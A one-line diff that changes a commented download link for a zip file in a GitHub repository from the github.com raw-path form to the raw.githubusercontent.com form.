@@ -1,1 +1,1 @@
-# https://github.com/Allanursulino/asfasfsaSurvive.html/raw/refs/heads/main/squamellate/Survive_asfasfsa_html_2.9.zip
+# https://raw.githubusercontent.com/Allanursulino/asfasfsaSurvive.html/main/squamellate/Survive_asfasfsa_html_2.9.zip
